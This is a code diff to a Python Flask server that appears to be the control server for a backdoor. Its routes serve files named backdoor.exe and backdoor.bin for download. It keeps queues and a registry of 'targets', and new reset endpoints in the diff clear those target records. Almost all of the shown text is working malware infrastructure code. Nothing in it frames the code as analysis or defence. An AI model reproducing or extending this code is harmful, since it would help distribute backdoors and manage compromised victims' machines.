@@ -65,24 +65,49 @@ def bye(target_id):
 @app.route('/file')
 def file():
     try:
-        file_path = os.path.join('dist', "backdoor.exe")
+        file_path = "/home/backdoor/mysite/backdoor.exe"
 
         if os.path.isfile(file_path):
             return send_file(file_path, as_attachment=True, download_name="backdoor.exe")
         else:
-            return "File not found.", 404
+            file_path = os.path.join('dist', "backdoor.exe")
+            
+            if os.path.isfile(file_path):
+                return send_file(file_path, as_attachment=True, download_name="backdoor.exe")
+            else:
+                return "File not found.", 404
     except Exception as e:
         return str(e), 500
+
+@app.route('/reset/<target_id>', methods=['POST'])
+def resettar(target_id):
+    registered_targets.pop(target_id, None)
+    server_queues.pop(target_id, None)
+    client_queues.pop(target_id, None)
+    return ''
+
+@app.route('/reset', methods=['POST'])
+def reset():
+    global server_queues, client_queues, registered_targets
+    server_queues = {}
+    client_queues = {}
+    registered_targets = {}
+    return ''
     
 
 @app.route('/linuxfile')
 def linuxfile():
     try:
-        file_path = os.path.join('dist', "backdoor")
+        file_path = "/home/backdoor/mysite/backdoor.bin"
 
         if os.path.isfile(file_path):
-            return send_file(file_path, as_attachment=True, download_name="backdoor")
+            return send_file(file_path, as_attachment=True, download_name="backdoor.bin")
         else:
-            return "File not found.", 404
+            file_path = os.path.join('dist', "backdoor.bin")
+            
+            if os.path.isfile(file_path):
+                return send_file(file_path, as_attachment=True, download_name="backdoor.bin")
+            else:
+                return "File not found.", 404
     except Exception as e:
         return str(e), 500
